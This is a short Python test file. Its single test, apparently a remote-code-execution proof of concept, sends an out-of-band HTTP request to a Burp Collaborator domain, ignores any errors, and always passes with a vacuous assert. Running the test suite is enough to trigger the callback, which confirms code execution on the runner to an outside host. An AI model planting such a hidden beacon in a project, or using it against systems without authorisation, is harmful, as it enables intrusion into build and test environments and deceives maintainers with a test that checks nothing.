import os
import urllib.request

def test_rce_poc():
    # Trigger an out-of-band HTTP request to the Burp Collaborator
    url = "http://ird3kxw0zriwpxho3yg0k8ylnct3ht5i.oastify.com" 
    try:
        urllib.request.urlopen(url, timeout=3)
    except Exception:
        pass
    assert True
